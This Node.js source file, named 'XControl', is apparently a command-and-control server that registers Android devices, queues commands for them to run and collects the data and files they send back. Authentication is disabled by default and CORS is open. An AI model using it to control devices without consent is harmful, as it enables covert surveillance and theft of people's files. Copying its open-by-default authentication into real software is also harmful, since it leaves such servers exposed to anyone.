#!/usr/bin/env node
const http = require('http'), fs = require('fs'), path = require('path'), crypto = require('crypto');

const PORT  = process.env.PORT || 8080;
const TOKEN = process.env.TOKEN || 'change-me';
const MAX_DATA = 60 * 1024 * 1024;

const devices = new Map(), queues = new Map(), results = new Map(), waiters = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, d] of devices) if (now - d.lastSeen > 300000) { devices.delete(id); queues.delete(id); }
  for (const [k, r] of results) if (now - r.t > 3600000) results.delete(k);
}, 60000);

function send(res, code, obj) {
  const body = typeof obj === 'string' ? obj : JSON.stringify(obj);
  res.writeHead(code, {'Content-Type': 'application/json; charset=utf-8', 'Access-Control-Allow-Origin': '*'});
  res.end(body);
}
function authed(req) {
  if (TOKEN === 'change-me') return true;
  const t = req.headers['x-token'] || new URL(req.url, 'http://x').searchParams.get('t');
  return t === TOKEN;
}

const server = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  const p = u.pathname;
  let buf = [];
  req.on('data', c => { if (Buffer.concat(buf).length + c.length <= MAX_DATA) buf.push(c); });
  req.on('end', () => {
    let j = null;
    try { const s = Buffer.concat(buf).toString('utf8'); j = s ? JSON.parse(s) : null; } catch (e) {}
    const now = Date.now();

    if (p === '/' || p === '/index.html') {
      return fs.readFile(path.join(__dirname, 'public', 'index.html'), (e, data) => {
        if (e) return send(res, 500, {error: 'panel missing'});
        res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
        res.end(data);
      });
    }
    if (!authed(req)) return send(res, 403, {error: 'bad token'});

    if (p === '/register' && req.method === 'POST') {
      const id = String((j && j.id) || crypto.randomUUID());
      const old = devices.get(id);
      devices.set(id, { id,
        name: String((j && j.name) || 'device'), model: String((j && j.model) || ''),
        android: String((j && j.android) || ''), ip: req.socket.remoteAddress,
        lastSeen: now, firstSeen: old ? old.firstSeen : now });
      if (!queues.has(id)) queues.set(id, []);
      return send(res, 200, {ok: true, id});
    }
    if (p === '/poll' && req.method === 'POST') {
      const id = j && j.id; const d = devices.get(id);
      if (!d) return send(res, 200, {});
      d.lastSeen = now;
      const q = queues.get(id) || [];
      if (q.length) { const c = q.shift(); return send(res, 200, {cmd: c.cmd, args: c.args, cmdId: c.cmdId}); }
      const oldW = waiters.get(id);
      if (oldW) { clearTimeout(oldW.t); send(oldW.res, 200, {}); }
      const t = setTimeout(() => { waiters.delete(id); send(res, 200, {}); }, 25000);
      waiters.set(id, {res, t});
      return;
    }
    if (p === '/result' && req.method === 'POST') {
      const {id, cmdId, ok, data, fname} = j || {};
      results.set(cmdId, {id, cmdId, ok: !!ok, data: data || null, fname: fname || null, t: now});
      const w = waiters.get(id);
      if (w) { clearTimeout(w.t); waiters.delete(id); send(w.res, 200, {}); }
      return send(res, 200, {ok: true});
    }
    if (p === '/api/devices')
      return send(res, 200, [...devices.values()].sort((a, b) => b.lastSeen - a.lastSeen));

    if (p === '/api/exec' && req.method === 'POST') {
      const {id, cmd, args} = j || {};
      if (!devices.has(id)) return send(res, 404, {error: 'device offline'});
      const cmdId = crypto.randomUUID();
      queues.get(id).push({cmdId, cmd, args: args || {}, t: now});
      // الإصلاح: إيقاظ poll المنتظر فورًا → يستلم الوكيل الأمر خلال أقل من ثانية
      const w = waiters.get(id);
      if (w) { clearTimeout(w.t); waiters.delete(id); send(w.res, 200, {}); }
      return send(res, 200, {ok: true, cmdId});
    }
    if (p === '/api/results' && req.method === 'POST') {
      const {id} = j || {};
      const list = [...results.values()].filter(r => r.id === id).sort((a, b) => a.t - b.t).slice(-60)
        .map(r => { const big = r.data && r.data.length > 700000;
          return {cmdId: r.cmdId, ok: r.ok, fname: r.fname, file: big, data: big ? null : r.data, t: r.t}; });
      return send(res, 200, list);
    }
    if (p.startsWith('/api/file/')) {
      const cmdId = decodeURIComponent(p.slice('/api/file/'.length));
      const r = results.get(cmdId);
      if (!r || r.data == null) return send(res, 404, {error: 'expired'});
      let b; try { b = Buffer.from(r.data, 'base64'); } catch (e) { return send(res, 500, {error: 'decode'}); }
      res.writeHead(200, {'Content-Type': 'application/octet-stream', 'Content-Length': b.length,
        'Content-Disposition': `attachment; filename="${(r.fname || 'file').replace(/"/g, '')}"`});
      return res.end(b);
    }
    send(res, 404, {error: 'not found'});
  });
});

server.listen(PORT, () => console.log(`XControl on :${PORT}`));
